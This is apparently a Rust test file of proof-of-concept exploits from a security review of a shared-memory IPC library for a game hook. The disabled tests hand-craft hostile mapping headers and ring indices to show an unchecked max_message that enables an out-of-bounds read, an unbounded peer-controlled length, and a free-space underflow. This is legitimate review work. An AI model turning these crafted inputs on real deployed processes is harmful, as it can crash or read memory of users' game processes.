//! Adversarial-review proof-of-concept: a hostile peer that creates the shared
//! mapping itself and writes an arbitrary 64-byte header and ring bytes, then a
//! normal `Link::open` on this side consumes them.
//!
//! The threat model (see the review brief and `docs/HOOKS.md`) treats the peer
//! as untrusted: it may write any header field and any ring index. In TPF3-MP
//! the agent is the owner/creator and the in-game hook is the opener/consumer,
//! so a malicious or crashed agent - or any same-user process that pre-creates
//! the predictably named object - is exactly this hostile peer, and the reads it
//! provokes happen inside the game process.
//!
//! These tests do not create the mapping through `Link::create` (which validates
//! its inputs); they lay out the raw shared object by hand, the way a foreign
//! agent would. The Win32 calls are declared here directly so the PoC adds no
//! dependency to the crate under review. All tests are `#[ignore]`d so the
//! normal suite stays green; each doc comment says whether it is safe to run.
#![cfg(windows)]
#![allow(unsafe_code, clippy::unwrap_used)]

use core::ffi::c_void;
use std::panic::{AssertUnwindSafe, catch_unwind};

use tpf3mp_ipc::{Link, Role};

// Win32 memory API, declared directly (kernel32) to avoid a dev-dependency.
#[link(name = "kernel32")]
unsafe extern "system" {
    fn CreateFileMappingW(
        h_file: *mut c_void,
        attrs: *const c_void,
        protect: u32,
        max_high: u32,
        max_low: u32,
        name: *const u16,
    ) -> *mut c_void;
    fn MapViewOfFile(
        h: *mut c_void,
        access: u32,
        off_high: u32,
        off_low: u32,
        bytes: usize,
    ) -> *mut c_void;
}

const PAGE_READWRITE: u32 = 0x04;
const FILE_MAP_ALL_ACCESS: u32 = 0x000F_001F;

// Header offsets, mirroring `tpf3mp-ipc/src/header.rs` (the ABI in HOOKS.md).
const OFF_MAGIC: usize = 0;
const OFF_ABI: usize = 4;
const OFF_HEADER_SIZE: usize = 8;
const OFF_RING_CAPACITY: usize = 12;
const OFF_MAX_MESSAGE: usize = 16;
const OFF_SESSION: usize = 20;
const OFF_H2A_HEAD: usize = 48;
const OFF_A2H_HEAD: usize = 56;
const OFF_A2H_TAIL: usize = 60;
const HEADER_SIZE: usize = 64;
const MAGIC: u32 = u32::from_le_bytes(*b"T3MP");

/// Replicates `shm::fnv1a_32`, used only to derive the OS object name.
fn fnv1a_32(bytes: &[u8]) -> u32 {
    let mut hash = 0x811c_9dc5u32;
    for &byte in bytes {
        hash ^= u32::from(byte);
        hash = hash.wrapping_mul(0x0100_0193);
    }
    hash
}

/// Replicates `shm::imp::wide_name` (Windows) so the PoC creates the very object
/// `Link::open` will look up for `logical`.
fn wide_name(logical: &str) -> Vec<u16> {
    let user = std::env::var("USERNAME").unwrap_or_else(|_| "user".to_owned());
    let mut seed = user.into_bytes();
    seed.push(0);
    seed.extend_from_slice(logical.as_bytes());
    let hash = fnv1a_32(&seed);
    let name = format!("Local\\tpf3mp.{hash:08x}");
    name.encode_utf16().chain(core::iter::once(0)).collect()
}

fn unique_logical(tag: &str) -> String {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    format!("poc.{tag}.{}.{nanos}", std::process::id())
}

/// A hand-built hostile mapping. The view is intentionally kept alive (and the
/// handle leaked) for the lifetime of the test process; the peer writes the
/// header/ring through `base`, while `Link::open` maps its own view of the same
/// object.
struct HostileMapping {
    base: *mut u8,
}

impl HostileMapping {
    /// Creates the object for `logical` and writes a header that passes
    /// `Link::open`'s validation for everything it checks, with the given
    /// `ring_capacity` and `max_message` (which `open` does *not* cross-check).
    fn create(logical: &str, ring_capacity: u32, max_message: u32) -> Self {
        let total = HEADER_SIZE + 2 * ring_capacity as usize;
        let name = wide_name(logical);
        let invalid = core::ptr::without_provenance_mut::<c_void>(usize::MAX); // INVALID_HANDLE_VALUE
        // SAFETY: a pagefile-backed mapping with a valid wide name; the OS
        // zero-fills the object.
        let handle = unsafe {
            CreateFileMappingW(
                invalid,
                core::ptr::null(),
                PAGE_READWRITE,
                (total as u64 >> 32) as u32,
                (total as u64 & 0xffff_ffff) as u32,
                name.as_ptr(),
            )
        };
        assert!(!handle.is_null(), "CreateFileMappingW failed");
        // SAFETY: `handle` is valid; map the whole object.
        let view = unsafe { MapViewOfFile(handle, FILE_MAP_ALL_ACCESS, 0, 0, total) };
        assert!(!view.is_null(), "MapViewOfFile failed");
        let base = view.cast::<u8>();

        let put = |off: usize, v: u32| {
            // SAFETY: `off` is within the mapped `total` bytes.
            unsafe { base.add(off).cast::<u32>().write_unaligned(v) };
        };
        put(OFF_ABI, 1);
        put(OFF_HEADER_SIZE, HEADER_SIZE as u32);
        put(OFF_RING_CAPACITY, ring_capacity);
        put(OFF_MAX_MESSAGE, max_message);
        put(OFF_SESSION, 1);
        // Publish the magic last, as the ABI requires.
        put(OFF_MAGIC, MAGIC);
        Self { base }
    }

    /// Writes a little-endian u32 at a header offset after `Link::open`.
    fn put_u32(&self, off: usize, v: u32) {
        // SAFETY: header offsets are within the mapping.
        unsafe { self.base.add(off).cast::<u32>().write_unaligned(v) };
    }

    /// Writes raw bytes into the agent->hook ring's data area at `data_offset`.
    fn put_a2h_bytes(&self, ring_capacity: u32, data_offset: usize, bytes: &[u8]) {
        let at = HEADER_SIZE + ring_capacity as usize + data_offset;
        // SAFETY: `data_offset < ring_capacity`, so `at` is within the mapping.
        unsafe {
            core::ptr::copy_nonoverlapping(bytes.as_ptr(), self.base.add(at), bytes.len());
        }
    }
}

/// FINDING 1 (High). `Link::open` never checks `max_message` against
/// `ring_capacity`, unlike `Link::create`. A hostile owner can therefore make
/// `max_message` larger than the ring, breaking the invariant that both
/// `read_wrapping`/`write_wrapping` and the `pop_into` corruption check rely on.
///
/// Safe to run: this only asserts that `open` accepts the out-of-range value.
#[test]
#[ignore = "review PoC (High): Link::open accepts max_message > ring_capacity; safe to run"]
fn open_accepts_max_message_larger_than_ring() {
    let logical = unique_logical("badmax");
    let _map = HostileMapping::create(&logical, 4096, 5 * 4096);
    let link = Link::open(&logical, Role::Hook).expect("open should accept the hostile header");
    assert_eq!(link.ring_capacity(), 4096);
    assert_eq!(link.max_message(), 5 * 4096);
    assert!(
        link.max_message() > link.ring_capacity(),
        "the ring's core invariant (max_message <= ring_capacity) is violated, \
         yet open succeeded; this is what enables the pop_into over-read"
    );
}

/// FINDING 1 (High), the actual memory-safety consequence. With `max_message`
/// unbounded, a hostile producer sets `tail` and a length prefix so a message of
/// `len > 2 * ring_capacity` passes every check in `pop_into`, and
/// `read_wrapping`'s single-wrap copy then reads `len - (capacity - start)`
/// bytes starting at the ring base - well past the `ring_capacity`-byte data
/// area, into the rest of the mapping and beyond its end.
///
/// DO NOT RUN: this performs an out-of-bounds read (undefined behaviour) and,
/// because the a2h ring is the last region in the mapping, will typically fault
/// and take the process down. It exists to document the exploit precisely.
#[test]
#[ignore = "review PoC (High): triggers the out-of-bounds read (UB / likely crash); do not run"]
fn pop_into_reads_out_of_bounds_when_max_message_unbounded() {
    const CAP: u32 = 4096;
    let logical = unique_logical("oob");
    let map = HostileMapping::create(&logical, CAP, 8 * CAP);
    let link = Link::open(&logical, Role::Hook).unwrap();

    // A frame claiming 3*CAP payload bytes: > max_message? no (max is 8*CAP);
    // available (3*CAP+4) >= 4 + 3*CAP? yes. So pop_into accepts it.
    let len = 3 * CAP;
    map.put_a2h_bytes(CAP, 0, &len.to_le_bytes());
    map.put_u32(OFF_A2H_HEAD, 0);
    map.put_u32(OFF_A2H_TAIL, len + 4);

    // A buffer sized from the (hostile) max_message, the pattern the shipped
    // `ipc-echo` helper and the integration tests use: vec![0; max_message].
    let mut out = vec![0u8; link.max_message() as usize];
    // Over-reads ~CAP bytes past the end of the mapping.
    let _ = link.recv_into(&mut out);
}

/// FINDING 2 (Medium). `peek_len`/`Link::next_len` return the raw u32 length
/// prefix with no `max_message` bound. A caller that sizes a receive buffer from
/// `next_len` (a natural reading of the API - "the length of the next waiting
/// message, for sizing a receive buffer") can be driven to allocate up to 4 GiB
/// by a hostile peer, even when `max_message` is honest.
///
/// Safe to run: only inspects the returned length.
#[test]
#[ignore = "review PoC (Medium): next_len returns an unbounded peer-controlled length; safe to run"]
fn next_len_is_unbounded_by_max_message() {
    const CAP: u32 = 4096;
    let logical = unique_logical("nextlen");
    // Honest max_message this time - the finding does not need finding 1.
    let map = HostileMapping::create(&logical, CAP, 1024);
    let link = Link::open(&logical, Role::Hook).unwrap();

    // Make >= 4 bytes "available" and write a length prefix of 0xFFFF_FFFF.
    map.put_u32(OFF_A2H_HEAD, 0);
    map.put_u32(OFF_A2H_TAIL, 16);
    map.put_a2h_bytes(CAP, 0, &0xFFFF_FFFFu32.to_le_bytes());

    assert_eq!(
        link.next_len(),
        Some(0xFFFF_FFFF),
        "next_len surfaces a 4 GiB length a hostile peer wrote, far above max_message ({}); \
         a caller sizing an allocation from this would allocate 4 GiB",
        link.max_message()
    );
}

/// FINDING 3 (Medium/Low). The producer's free-space computation
/// `free = self.capacity - used` (ring.rs) is an unchecked subtraction. A
/// hostile consumer can set `head` so that `used = tail - head` (wrapping)
/// exceeds `capacity`; the subtraction then underflows. In a debug build this
/// panics (a hostile peer can crash the producer); in a release build - what the
/// game ships - it wraps to a huge `free`, the `need > free` guard passes, and
/// the producer overwrites the ring. The writes stay in bounds (masked), so this
/// is ring corruption / a panic-DoS, not an out-of-bounds write.
///
/// Runnable, but in a debug build it deliberately provokes (and catches) a
/// subtract-with-overflow panic, which prints a panic message to stderr.
#[test]
#[ignore = "review PoC (Medium): hostile head underflows the producer's free-space math; runnable"]
fn producer_free_space_underflows_with_hostile_head() {
    const CAP: u32 = 4096;
    let logical = unique_logical("underflow");
    // We open as the Hook, i.e. the producer of the hook->agent ring; the peer
    // (agent) owns h2a_head. A valid max_message isolates this from finding 1.
    let map = HostileMapping::create(&logical, CAP, 1024);
    let link = Link::open(&logical, Role::Hook).unwrap();

    // h2a_tail is 0 (fresh); set h2a_head so tail - head wraps to > capacity.
    map.put_u32(OFF_H2A_HEAD, CAP + 4);

    let result = catch_unwind(AssertUnwindSafe(|| link.send(b"x")));
    match result {
        Err(_) => {
            // Debug build: unchecked `capacity - used` underflowed and panicked.
        }
        Ok(send_result) => {
            // Release build: no panic; the guard was bypassed by the wrapped
            // free value, so the (in-bounds, masked) write was allowed.
            assert!(
                send_result.is_ok(),
                "release build accepted the send despite used > capacity"
            );
        }
    }
}
